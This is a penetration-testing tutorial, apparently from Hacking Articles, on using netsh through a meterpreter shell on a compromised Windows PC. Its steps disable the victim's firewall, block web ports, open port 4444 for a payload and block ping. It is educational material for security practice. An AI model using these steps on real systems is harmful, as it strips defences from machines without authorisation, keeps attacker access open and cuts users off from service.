@@ -1,0 +1,100 @@
+
+Firewall Penetration Testing in Remote Windows PC (netsh Tutorial)
+
+Firewall is a network security system designed to prevent unauthorized access to or from a private network. Firewalls can be implemented in varied modes i.e. hardware, software, or a combination of both. There are many types of firewall such as Proxy firewall, Application firewall, Stateful firewall, Packet firewall, etc.
+Firewalls are connected to network  and are frequently used to prevent unauthorized Internet users from accessing private networks connected to the Internet, especially intranets ensuring security. All messages entering into or leaving the intranet passes through a firewall, which examines each message and block those which do not meet the specified security criteria.
+ Firewall is functional on two rules which are always encircled by Inbound and outbound rules:
+Inbound rules : These are the ones which filter traffic passing from the network to the local computer based on the filtering conditions specified in the rule.
+Outbound rules : These are the ones which filter traffic passing from the local computer to the network based on the filtering conditions specified in the rule.
+Both inbound and outbound rules can be configured to allow or block traffic as needed.
+In other words we can say that Inbound rules are to do with other things accessing your computer. If you are running a Web Server on your computer then you will have to tell the Firewall that outsiders are allowed to connect to it. Further Outbound rules categorizes some programs to use the Internet yet block others. You will want to let your Web Browser (Internet Explorer, Firefox, Safari, Chrome, Opera…) have an accessibility to the Internet, so a command can be inserted which displays that Windows Firewall is allowed.
+Now let us assume that the firewall of the victim’s PC is enabled:
+First hack The Victim PC read Here
+
+So to turn off the firewall of victim’s PC, first of all get a session through meterpreter and then take the administrator privileges of the remote PC. Move on to the shell of remote PC and write
+netsh firewall set opmode mode=disable to turn off the firewall of remote PC.
+
+And like this, the firewall of remote PC will be disabled.
+
+We can not only turn off or on the firewall through metasploit but we can also block and allow the access to any particular port. Yes, that means we can control Inbound and Outbound rules as well. Again after having the session through meterpreter and bypassing administrative privileges and going to the shell of the remote PC just type
+netsh advfirewall firewall add rule name=”Block Ports” protocol=TCP dir=out remoteport=80 action=block
+Here,
+Name = The name of the rule. (Pick something descriptive)
+Protocol = The protocol we are going to block (UDP or TCP for most cases)
+Dir = The direction of the block. Can be IN or OUT
+Remote Port = The port of the remote host that is going to be blocked
+Action = Could be block or allow. In our case we want to block the connection
+
+Once you execute the above code, all outbound requests to any host on port 80 will be blocked, and it adds an entry to the Windows firewall:
+
+And if you check its properties and click on ‘Protocols and Ports’ tab then you can see the result.
+
+Now that we have how to block a port in remote PC, let us dig a little deeper i.e we can not only block one port but also two or more than two. And to block two to more port again take a meterpreter session as well as administrator privileges of the remote PC and just write
+netsh advfirewall firewall add rule name=”Block Ports” protocol=TCP dir=out remoteport=80,443 action=block
+
+Once you execute the above code, all outbound requests to any host on port 80 will be blocked, and it adds an entry to the Windows firewall:
+
+And if you check its properties and click on ‘Protocols and Ports’ tab then you will find that now it has blocked both port 80 and port 443:
+
+Now, by blocking ports 80 and 443 we have blocked the HTTP and HTTPS services on the remote PC and so our victim will not be able to access any website. And the following error is displayed :
+
+Now we will learn how to view inbound and outbound rules of firewall in remote PC, how to delete a rule, how to allow the port on which our payload will work in future, how to stop your remote PC from being ping.
+First of all let us assume that there is a blocked port in outbound rule in our remote PC:
+
+To know which rule is enabled and disabled in our remote PC , take a session through meterepreter and bypass administrator privileges. After doing so type:
+ netsh advfirewall firewall show rule=all
+Once this command is executed, all the rules will be displayed :
+
+In the above image we can see that Port 80 and Port 443 is blocked under the rule name “Block All Ports”.  So to delete that rule in the remote PC  type :
+Netsh  advfirewall firewall delete rule name=”Block All Ports” 
+
+Once this command executed, the said rule will be deleted. And you can run
+netsh advfirewall firewall show rule=all
+Command again to see the result :
+
+And we can also see the result in the firewall outbound rules :
+
+Our normal payload works on port 4444. Now, if we want to allow port 4444 so we can upload a payload which works on port 4444, we just have to type :
+netsh advfireweall firewall add rule name=”Allow Port 4444” protocol=TCP dir=out remoteport=4444 action=allow
+
+Once this command executed, port 4444 will be allowed on our remote PC :
+
+Now to block stop our remote PC from being pinged we can just type :
+netsh advfirewall firewall add rule name=”All ICMPV4” dir=in action=block protocol=icmpv4
+
+When this command will be executed, a rule blocking ping to our remote PC will created :
+
+And the following will be the result :
+
+Now  we will see how to block /allow particular IP Address in remote PC Firewall and also learn how to view details of programs added to the exception/allowed list and the details of port added to the exception/allowed list. Along with this we will learn how to see the status of the main settings of Firewall and what its current profile, i.e is whether it is on or off.
+netsh advfirewall show currentprofiles
+
+After knowing the profile of firewall we can see which programs are allowed by the host of Remote PC. For this, type:
+netsh firewall show allowedprogram
+
+We can also see which ports are allowed by the host of Remote PC. And for this, type:
+netsh firewall show portopening
+
+Our next command is to see the status of the main settings. And to see them, type:
+netsh firewall show config
+
+Next, we can also see the location of file in which all the firewall logs are kept. And for this, type:
+netsh firewall show logging
+
+Firewall also allows us to Block single IP address while allowing the others and vice versa. So first to let us learn how we can Block a single IP For this, type:
+netsh advfirewall firewall add rule name=”IP Block” dir=in interface=any action=block remoteip=192.168.0.15/32
+(In the abobe command “/32” is a subnet mask of IP.)
+
+After executing the said command, we can see the following result:
+
+And we now see the properties of the IP Block rule we can see that the IP: 192.168.0.15 is blocked:
+
+Now, similarly, to allow a particular IP Address, type:
+netsh advfirewall firewall add rule name=”Allow IP” dir=in interface=any action=allow remoteip=192.168.0.15/32
+(In the abobe command “/32” is a subnet mask of IP)
+
+After executing the said command, you can see the following result:
+
+And we now see the properties of the IP Block rule we can see that the IP : 192.168.0.15 is Allowed :
+
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
